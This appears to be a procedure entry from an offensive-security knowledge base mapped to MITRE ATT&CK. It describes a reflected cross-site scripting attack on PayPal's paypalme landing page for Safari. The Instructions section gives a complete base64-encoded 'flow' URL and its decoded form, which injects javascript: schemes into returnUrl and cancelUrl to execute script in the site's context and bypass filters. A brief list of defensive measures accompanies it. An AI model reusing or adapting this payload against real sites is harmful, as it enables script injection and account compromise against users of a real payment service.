---
id: proc-paypalme-xss-safari-navigate
tags:
  - xss
  - safari-exploit
  - payload-crafting
type: procedure
tools:
  - '[[tools/Safari]]'
tactics:
  - '[[Initial Access]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-13T23:55:38.026Z'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Craft-and-Navigate-to-XSS-Payload-URL-on-Safari

## Summary

This procedure adapts the base64-encoded payload for Safari's handling and navigates to the PayPalMe landing page, injecting the javascript: scheme into modal hrefs for cross-browser exploitation.

## Description

Safari requires a slightly modified encoding to handle the javascript: injection effectively, using direct alert encoding without SVG in some variants. The 'flow' parameter decodes to tainted URLs starting with 'javascripT:PAYPAL.com', bypassing filters. This sets up the modal for triggering, targeting the same endpoint. Outcomes include modal load with executable hrefs, demonstrating browser-specific evasion.

## Requirements

1. Safari browser installed on macOS or iOS.
2. Access to www.paypal.com.
3. Understanding of browser-specific URL parsing.

## Defense

Defensive measures and detection strategies:

- Validate decoded parameters against allowlists for schemes and protocols.
- Use Safari-specific CSP headers to block unsafe inline scripts.
- Scan for hex-encoded payloads in base64 inputs.
- Implement client-side validation for modal hrefs.

## Objectives

1. Inject payload compatible with Safari's scheme enforcement.
2. Render the vulnerable modal.
3. Prepare for JavaScript execution in site context.

## Instructions

### Step 1: Construct Safari-Adapted URL

**Context**: Build the payload with adjusted encoding for Safari.

Manually enter: `https://www.paypal.com/paypalme/my/landing?flow=cmV0dXJuVXJsPWphdmFzY3JpcFQ6UEFZUEFMLmNvbSUzZDEsbG9jYXRpb24lM2QmamF2YXNjcmlwdDphbGVydFx4Mjhkb2N1bWVudC5kb21haW5ceDI5JyZjYW5jZWxVcmw9amF2YXNjcmlwVDpQQVlQQUwuY29tJTNkMSxsb2NhdGlvbiUzZCdqYXZhc2NyaXB0OmFsZXJ0XHgyOGRvY3VtZW50LmRvbWFpblx4Mjkn`

> Decodes to returnUrl=javascript:PAYPAL.com%3D1,location%3D'javascript:alert(document.domain)'&cancelUrl=... (adapted).

### Step 2: Navigate in Safari

**Context**: Load the page to reflect the payload.

Paste into Safari's address bar and navigate.

**Expected Output**: Modal displays with injected buttons.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/Safari]]

## Tags

- [[xss]]
- [[safari-exploit]]
